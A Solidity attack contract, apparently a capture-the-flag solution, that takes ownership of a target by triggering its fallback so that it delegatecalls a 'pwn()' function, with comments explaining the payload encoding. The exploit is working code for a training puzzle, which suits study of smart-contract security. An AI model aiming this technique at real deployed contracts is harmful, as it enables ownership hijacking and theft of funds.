// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./Delegation.sol";

contract AttackingDelegation {
    address public contractAddress;

    constructor(address _contractAddress) {
        contractAddress = _contractAddress;
    }
    //need to execute pwn so that it changes the owner
    //fallback on delegation calls the delegate contract which has pwn
    //call method can access the fallback
    //delegate call in fallback will help us execute pwn and make it as if
    //our address is the one calling the function from the delegate contract


    //solution:
    //The functions abi.encodeWithSignature(...) and abi.encodeWithSelector(...) 
    //can be used in Solidity to prepare payloads in raw bytes for external contract calls. 
    //Such payloads can then be passed as parameters to the low level Solidity .call(...) , 
    //.delegatecall(...) and .staticcall(...) functions.

    function hackContract() external {
        contractAddress.call(abi.encodeWithSignature("pwn()"));
    }
}
